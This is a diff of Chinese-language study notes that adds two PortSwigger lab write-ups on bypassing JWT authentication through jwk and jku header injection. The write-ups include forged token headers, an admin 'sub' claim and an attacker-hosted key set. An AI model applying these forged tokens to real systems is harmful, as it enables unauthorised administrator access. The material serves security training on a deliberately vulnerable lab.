@@ -179,6 +179,50 @@ jwk 要怎麼生成?
 - Burp Suite JWT Editor extension
 - https://www.npmjs.com/package/jose
 
+## Lab: JWT authentication bypass via jwk header injection
+
+| Dimension | Description                                                                                     |
+| --------- | ----------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter       |
+| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection |
+
+這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是
+
+```json
+{"kid":"5c287417-9c08-4af3-ad4f-f4f0eaefd8c0","alg":"RS256"}
+{"iss":"portswigger","exp":1761530470,"sub":"wiener"}
+```
+
+用 Burp Suite JWT Extension 生成一把 jwk
+
+![new-jwk-in-burp](../../static/img/new-jwk-in-burp.jpg)
+
+之後在 burp repeater 生成以下 jwt
+
+```json
+{
+    "kid": "5c287417-9c08-4af3-ad4f-f4f0eaefd8c0",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "5c287417-9c08-4af3-ad4f-f4f0eaefd8c0",
+        "n": "o4j9M7tcX3eTHUopQ3Te2iV46G3b--TKQzTLJL6g04H7qh4DtI0dopdp-290mzi6410Uu7uxYuDOErkNp-xdNWJSbZ3xlnOaoAPDAadwEORwWqpeGvJ6P-OJSb0Um3qidYE6e3HbbBdEPFuhoVyrheX1hA6-wKsUnowpyhKFv-Uo9IBuB5OK7sNpMkl21GA6X7dT9_MCtdK8e6byzA4EF9rR6va2LpP-atYt-uaM4avpRawksx-KjzTpfKI34O45RTCmhOZEy3Y6oZjPTzqpZuttcScBRA4qn012ycRr2LGM22MeOPdvQFBjrApjlU-euLBFWSPTfrocynjLoRMxyQ"
+    }
+}
+
+{
+    "iss": "portswigger",
+    "exp": 1761530470,
+    "sub": "administrator"
+}
+```
+
+![burp-gen-jwk-in-repeater](../../static/img/burp-gen-jwk-in-repeater.jpg)
+
+成功解題～
+
 ## Injecting self-signed JWTs via the jku parameter
 
 https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter
@@ -203,6 +247,55 @@ https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-
   ]
 }
 ```
+
+## Lab: JWT authentication bypass via jku header injection
+
+| Dimension | Description                                                                                     |
+| --------- | ----------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter       |
+| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection |
+
+這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是
+
+```json
+{"kid":"8dee8308-aca2-4d76-ba57-62de6a74528d","alg":"RS256"}
+{"iss":"portswigger","exp":1761555388,"sub":"wiener"}
+```
+
+跟上面那題一樣，用 Burp Suite 生成一把 RSA Key，之後構造 jwt 為以下
+
+```json
+// header
+{
+    "jku": "https://exploit-0a8600d604fb3c158b747b550193005a.exploit-server.net/exploit",
+    "kid": "8dee8308-aca2-4d76-ba57-62de6a74528d",
+    "typ": "JWT",
+    "alg": "RS256"
+}
+// payload
+{
+    "iss": "portswigger",
+    "exp": 1761555736,
+    "sub": "administrator"
+}
+```
+
+並且在 exploit-sever 回傳以下 response body
+
+```json
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "kid": "8dee8308-aca2-4d76-ba57-62de6a74528d",
+      "n": "rQxlCvAL6iKBCwGkulExvykIRR5kyvLnKhKRVIQ20pLnw4dpUlWUrJXKlg-7HrdEF6RCHBH1Tv8W1l0wLC1YTnDU92iaNi3Zks9519NaS3Ze1oQ2EuacArcIQ6LrHyeiXRJgufkCAiBQflZXquyBedZ7BXGjUCZUjNsrWXf18ZI_wBCBpKnhJflDESVG7VF_Xfrkke20J_7vLxhP7b6ulwVisfA97lM_nQfXeLyQBwDWVwOBsAUOefESdZ--fdW0EtU3NgM3grNFW_TaMLQcSdJ8QTUr0Mt4NpEjaPcJxhsVoC6RzfqUz5j-GyJNumNJKPSGdXfCc17Pv18YSqmL0w"
+    }
+  ]
+}
+```
+
+之後把 token 塞回 cookie，成功解題～
 
 ## Injecting self-signed JWTs via the kid parameter
 
